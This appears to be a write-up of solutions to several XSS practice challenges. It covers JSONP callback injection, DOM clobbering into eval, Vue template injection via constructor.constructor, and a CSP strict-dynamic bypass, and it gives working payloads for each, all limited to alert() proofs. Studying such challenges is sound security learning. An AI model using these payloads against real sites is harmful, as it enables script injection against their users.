# 20
- JSONP
    - JSONP was invented to overcome SOP and to perform cross-domain communication.
    - AJAX to other domains are not allowed due to SOP.
    - However there is one exception; when scripts are read from src.
        - <script src="can-be-other-domain.hoge"></script>
    - Servers that allow JSONP create and return javascript file that calls the callback function specified by the caller with the requested value from the user
        - NG: <script>axios.get("api.example.com/user-name")</script>
            - The user wants to know the username.
            - Blocked by the SOP (without CORS).
        - OK: <script src="example.com/user-name-jsonp.php?callback=setUserName></script>
            - This will return a javascript like `setUserName("myusername")`.
            - The requested value (username) is passed to the user script by calling the callback.

    - [What is JSONP?](https://stackoverflow.com/questions/2067472/what-is-jsonp-and-why-was-it-created)
    - [JSONP injection](https://securitycafe.ro/2017/01/18/practical-jsonp-injection/)

## Answer
- Exploit the vulnerability that `jsonp.php` in this problem directly injects the callback parameter into the response.
- By sending script that we want to execute as the callback parameter arbitrary script execution is possible
- Dont forget to comment out the original script
    - or it will cause syntax error

- `<script src="jsonp.php?callback=alert('XSS'); //"></script>`
- `<script src="jsonp.php?callback=alert(document.domain); //></script>


# 21
- DOM elements' IDs are global variables
    - div tag below can be accessed from window.a

```
  <div id="a">Hello!</div>
  <script>console.log(a);//<div id="a">Hello!</div></script>
```  

- So the input value of ```<input type="hidden" id="equation" value="<?= $eq ?>"``` is accessable via window.equation.value

- Use DOM clobbering (?) to inject malicious payload to eval function
    - [DOM Clobbering まとめ](https://diary.shift-js.info/dom-clobbering/)

- ```<input type="hidden" id="equation" value="alert('XSS')" > <!--```
- ```<input type="hidden" id="equation" value="alert(document.domain)" > <!--```

- Don't forget to comment out the rest of the HTML to prevent same id
    - More than same IDs will cause undefined action
    - In this case if there are two <input type"hidden" id="equation... window.equation.value will become undefined


# 22
- There is a vue template injection vulnerability.
- However since in vue, variables that look like global variables will refer to vue instance data.
    - `{{alert(1)}}` will cause an error as undefined function.

- In JS `Function` with a capital letter is a constructor that can create function dynamically.
    - [Figure of JS Object layout](https://stackoverflow.com/questions/5963547/object-constructor-object-constructor-constructor-why)
    - We will use `Function` to create alert function dynamically.
- `[] instanceof Object === true`
- `[].constructor instanceof Function === true`
- `([].constructor.constructor === Function) === true`
- So using `[].constructor.constructor` we can create function dynamically.

- ```{{constructor.constructor("alert('XSS')")()}}```
- ```{{constructor.constructor("alert(document.domain)")()}}```

# 23
- The point is that there is `script-src 'strict-dynamic'` in the CSP.
- Usually with CSP inline scripts are disabled without a nonce.
- `strict-dynamic` will permit inline scripts without nonces, when the inline script is generated by a script with a nonce.  
```
<script nonce="random123">
se=document.createElement("script")
se.innerHTML = "alert(1)"
</script>
```
    - [nonce + strict-dynamic](https://inside.pixiv.blog/kobo/5137)

- ```alert("XSS")//<script id="injectarea"></script><!--```
- ```alert(document.domain)//<script id="injectarea"></script><!--```

# References
- http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info
- https://graneed.hatenablog.com/entry/2018/11/23/222842
